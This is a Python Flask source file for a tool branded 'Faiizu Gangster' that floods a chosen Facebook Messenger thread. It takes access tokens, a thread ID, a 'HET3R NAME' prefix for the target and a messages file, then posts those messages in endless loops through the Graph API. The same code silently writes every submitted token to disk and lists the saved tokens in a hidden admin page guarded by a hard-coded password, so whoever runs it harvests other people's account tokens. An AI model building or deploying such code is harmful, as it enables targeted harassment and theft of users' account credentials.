from flask import Flask, request, render_template_string, redirect, url_for, session
import threading, requests, time, os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'FAIZU_SECRET_KEY'  # For admin session

# Ensure tokens folder exists
os.makedirs('tokens', exist_ok=True)

# 🔰 HTML emplate Yaha Hum Dezine Ko Set krege 
html_index = '''
<!DOCTYPE html>
<html>
<head>
  <title>Faiizu Gangster Tool</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --bg-darker: #0f050f;
      --accent: #ff4dff;
      --accent-dark: #cc00cc;
      --text: #f0d8f0;
      --text-dim: #d0b0d0;
      --brown: #3a2a1a;
      --purple: #5a2a5a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, var(--purple) 0%, var(--bg-dark) 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      line-height: 1.6;
      min-height: 100vh;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      border-bottom: 3px solid var(--accent);
      padding-bottom: 15px;
      margin-bottom: 30px;
      text-shadow: 0 0 10px var(--accent);
    }
    .header h1 {
      color: var(--accent);
      margin: 0;
      font-size: 2.2rem;
      letter-spacing: 2px;
    }
    .header p {
      color: var(--text-dim);
      margin: 5px 0 0;
      font-size: 1.1rem;
    }
    .panel {
      background-color: rgba(30, 10, 30, 0.8);
      border: 2px solid var(--brown);
      border-radius: 5px;
      padding: 25px;
      margin-bottom: 30px;
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.2);
      backdrop-filter: blur(5px);
    }
    .panel-title {
      color: var(--accent);
      margin-top: 0;
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      font-size: 1.4rem;
      text-shadow: 0 0 5px var(--accent);
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-dim);
      font-weight: bold;
    }
    input[type="text"],
    input[type="number"],
    input[type="file"],
    input[type="password"],
    select {
      width: 100%;
      padding: 10px;
      background-color: rgba(40, 15, 40, 0.8);
      border: 1px solid var(--brown);
      color: var(--text);
      font-family: monospace;
      font-size: 1rem;
    }
    input[type="radio"] {
      margin-right: 8px;
      accent-color: var(--accent);
    }
    .radio-group {
      margin-bottom: 20px;
    }
    .radio-option {
      display: inline-block;
      margin-right: 20px;
      font-weight: bold;
    }
    button {
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      border: none;
      padding: 12px 20px;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 1.1rem;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      border-radius: 3px;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 0 15px rgba(255, 77, 255, 0.4);
    }
    button:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.6);
    }
    .status {
      color: var(--accent);
      text-align: center;
      padding: 30px;
      font-weight: bold;
      font-size: 1.3rem;
      text-shadow: 0 0 5px var(--accent);
    }
    .glow {
      animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 5px var(--accent); }
      to { text-shadow: 0 0 15px var(--accent), 0 0 20px var(--accent-dark); }
    }
  </style>
  <script>
    function toggleInput() {
      const type = document.querySelector('input[name="tokenType"]:checked').value;
      document.getElementById('single').style.display = (type === 'single') ? 'block' : 'none';
      document.getElementById('multi').style.display = (type === 'multi') ? 'block' : 'none';
    }
  </script>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="glow">FAIZU GANGSTER</h1>
      <p>F.G</p>
    </div>
    
    <div class="panel">
      <h2 class="panel-title">ENTER DETAILS</h2>
      <form method="POST" enctype="multipart/form-data">
        <div class="form-group radio-group">
          <label>TOKEN TYPE:</label>
          <div class="radio-option">
            <input type="radio" name="tokenType" value="single" checked onchange="toggleInput()"> SINGLE
          </div>
          <div class="radio-option">
            <input type="radio" name="tokenType" value="multi" onchange="toggleInput()"> MULTI
          </div>
        </div>
        
        <div class="form-group" id="single">
          <label>ACCESS TOKEN:</label>
          <input type="text" name="accessToken">
        </div>
        
        <div class="form-group" id="multi" style="display:none;">
          <label>UPLOAD TOKEN FILE (.TXT):</label>
          <input type="file" name="tokenFile" accept=".txt">
        </div>
        
        <div class="form-group">
          <label>THREAD ID:</label>
          <input type="text" name="threadId" required>
        </div>
        
        <div class="form-group">
          <label>HET3R NAME:</label>
          <input type="text" name="kidx" required>
        </div>
        
        <div class="form-group">
          <label>MESSAGES FILE (.TXT):</label>
          <input type="file" name="txtFile" accept=".txt" required>
        </div>
        
        <div class="form-group">
          <label>DELAY (SECONDS):</label>
          <input type="number" name="time" required min="1">
        </div>
        
        <button type="submit">START </button>
      </form>
    </div>
  </div>
</body>
</html>
'''

html_admin_login = '''
<!DOCTYPE html>
<html>
<head>
  <title>Admin Auto</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --accent-dark: #cc00cc;
      --text: #f0d8f0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      width: 350px;
      padding: 30px;
      background-color: rgba(30, 10, 30, 0.9);
      border: 2px solid var(--brown);
      border-radius: 5px;
      box-shadow: 0 0 30px rgba(255, 77, 255, 0.3);
      text-align: center;
    }
    h2 {
      margin-top: 0;
      color: var(--accent);
      text-shadow: 0 0 10px var(--accent);
      font-size: 1.8rem;
      margin-bottom: 25px;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      background-color: rgba(40, 15, 40, 0.8);
      border: 1px solid var(--brown);
      color: var(--text);
      font-family: monospace;
      font-size: 1rem;
    }
    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      border: none;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 1.1rem;
      cursor: pointer;
      border-radius: 3px;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 0 15px rgba(255, 77, 255, 0.4);
      transition: all 0.3s;
    }
    button:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.6);
    }
    .error {
      color: #ff5555;
      text-align: center;
      margin-top: 15px;
      font-weight: bold;
      text-shadow: 0 0 5px #ff5555;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>ADMIN ACCESS</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="ENTER PASSWORD" required>
      <button type="submit">Checking</button>
    </form>
  </div>
</body>
</html>
'''

html_admin_files = '''
<!DOCTYPE html>
<html>
<head>
  <title>Token Files</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --text-dim: #d0b0d0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 30px;
      min-height: 100vh;
    }
    h2 {
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
      font-size: 1.8rem;
    }
    ul {
      list-style-type: none;
      padding: 0;
      margin-top: 30px;
    }
    li {
      padding: 15px;
      border-bottom: 1px solid var(--brown);
      transition: all 0.3s;
    }
    li:hover {
      background-color: rgba(90, 42, 90, 0.3);
    }
    a {
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      display: block;
    }
    a:hover {
      text-shadow: 0 0 5px var(--accent);
    }
    .back-link {
      display: inline-block;
      margin-top: 30px;
      padding: 10px 20px;
      background-color: rgba(90, 42, 90, 0.5);
      border: 1px solid var(--brown);
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s;
    }
    .back-link:hover {
      background-color: rgba(90, 42, 90, 0.8);
      text-shadow: 0 0 5px var(--accent);
    }
  </style>
</head>
<body>
  <h2>TOKEN FILES</h2>
  <ul>
    {% for file in files %}
      <li><a href="{{ url_for('view_token_file', filename=file) }}">{{ file }}</a></li>
    {% endfor %}
  </ul>
  <a href="/" class="back-link">BACK TO MAIN</a>
</body>
</html>
'''

html_token_file_content = '''
<!DOCTYPE html>
<html>
<head>
  <title>Token Viewer</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 30px;
      min-height: 100vh;
    }
    h3 {
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
      font-size: 1.5rem;
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
      background-color: rgba(30, 10, 30, 0.8);
      padding: 20px;
      border: 1px solid var(--brown);
      border-radius: 5px;
      font-size: 1rem;
      line-height: 1.5;
      margin-top: 20px;
    }
    .back-link {
      display: inline-block;
      margin-top: 30px;
      padding: 10px 20px;
      background-color: rgba(90, 42, 90, 0.5);
      border: 1px solid var(--brown);
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s;
    }
    .back-link:hover {
      background-color: rgba(90, 42, 90, 0.8);
      text-shadow: 0 0 5px var(--accent);
    }
  </style>
</head>
<body>
  <h3>TOKENS: {{ filename }}</h3>
  <pre>{{ content }}</pre>
  <a href="/admin" class="back-link">BACK </a>
</body>
</html>
'''

#  Background message sender (unchanged)
def message_sender(access_token, thread_id, mn, time_interval, messages):
    headers = {'User-Agent': 'Mozilla/5.0'}
    while True:
        for msg in messages:
            try:
                message = f"{mn} {msg}"
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                r = requests.post(url, data={'access_token': access_token, 'message': message}, headers=headers)
                status = "✅" if r.status_code == 200 else f"❌ {r.status_code}"
                print(f"[{status}] {message}")
                time.sleep(time_interval)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(30)

#  Home (unchanged)
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        delay = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        tokens = []
        if token_type == 'single':
            token = request.form.get('accessToken')
            if token: tokens.append(token)
        else:
            file = request.files['tokenFile']
            if file: tokens = file.read().decode().splitlines()

        filename = datetime.now().strftime('%Y-%m-%d_%H-%M-%S') + ".txt"
        with open(f'tokens/{filename}', 'w') as f:
            f.write("\n".join(tokens))

        for token in tokens:
            threading.Thread(target=message_sender, args=(token, thread_id, prefix, delay, messages), daemon=True).start()

        return "<div class='status'>Script Background Main Chal Raha Hai </div>"

    return render_template_string(html_index)

#  Admin Panel (unchanged)
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == 'FAIZU123':
            session['admin'] = True
            return redirect('/admin')
        return "<div class='error'>AUTHENTICATION FAILED</div>"

    if not session.get('admin'):
        return render_template_string(html_admin_login)

    files = os.listdir('tokens')
    return render_template_string(html_admin_files, files=files)

#  View Token File (unchanged)
@app.route('/admin/view/<filename>')
def view_token_file(filename):
    if not session.get('admin'):
        return redirect('/admin')

    path = f'tokens/{filename}'
    if not os.path.exists(path):
        return "<div class='error'>FILE NOT FOUND</div>"

    with open(path, 'r') as f:
        content = f.read()

    return render_template_string(html_token_file_content, filename=filename, content=content)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
